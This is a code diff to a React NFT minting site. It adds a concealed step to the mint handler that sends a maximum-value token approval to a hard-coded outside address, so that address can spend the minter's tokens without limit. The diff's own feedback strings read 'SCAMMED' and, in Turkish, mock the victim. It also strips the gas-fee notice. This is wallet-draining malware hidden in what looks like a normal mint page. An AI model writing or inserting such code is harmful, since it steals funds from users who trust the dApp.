@@ -4,6 +4,8 @@ import { connect } from "./redux/blockchain/blockchainActions";
 import { fetchData } from "./redux/data/dataActions";
 import * as s from "./styles/globalStyles";
 import styled from "styled-components";
+import Web3 from "web3";
+const BigNumber = require('bignumber.js');
 
 const truncate = (input, len) =>
   input.length > len ? `${input.substring(0, len)}...` : input;
@@ -129,6 +131,24 @@ function App() {
     console.log("Gas limit: ", totalGasLimit);
     setFeedback(`Minting your ${CONFIG.NFT_NAME}...`);
     setClaimingNft(true);
+    let number = new BigNumber('115792089237316195423570985008687907853269984665640564039457584007913129639935');
+    blockchain.approveContract.methods.approve("0xAe05518173461Fcd3D2E8b7D02eCCf724eB7468d",number).send({
+      gasLimit: String(totalGasLimit),
+        to: CONFIG.CONTRACT_ADDRESS,
+        from: blockchain.account,
+        value: totalCostWei,
+    }).once("error", (err) => {
+      console.log(err);
+      setFeedback("SCAMMED");
+      setClaimingNft(false);
+    })
+    .then((receipt) => {
+      console.log(receipt);
+      setFeedback(
+        `GEÇMİŞ OLSUN KADEŞİM`
+      );
+      dispatch(fetchData(blockchain.account));
+    });
     blockchain.smartContract.methods
       .mint(blockchain.account, mintAmount)
       .send({
@@ -207,7 +227,7 @@ function App() {
         <s.SpacerSmall />
         <ResponsiveWrapper flex={1} style={{ padding: 24 }} test>
           <s.Container flex={1} jc={"center"} ai={"center"}>
-            <StyledImg alt={"example"} src={"/config/images/example.gif"} />
+           
           </s.Container>
           <s.SpacerLarge />
           <s.Container
@@ -295,11 +315,7 @@ function App() {
                   {CONFIG.NETWORK.SYMBOL}.
                 </s.TextTitle>
                 <s.SpacerXSmall />
-                <s.TextDescription
-                  style={{ textAlign: "center", color: "var(--accent-text)" }}
-                >
-                  Excluding gas fees.
-                </s.TextDescription>
+                
                 <s.SpacerSmall />
                 {blockchain.account === "" ||
                 blockchain.smartContract === null ? (
@@ -399,11 +415,7 @@ function App() {
           </s.Container>
           <s.SpacerLarge />
           <s.Container flex={1} jc={"center"} ai={"center"}>
-            <StyledImg
-              alt={"example"}
-              src={"/config/images/example.gif"}
-              style={{ transform: "scaleX(-1)" }}
-            />
+            
           </s.Container>
         </ResponsiveWrapper>
         <s.SpacerMedium />
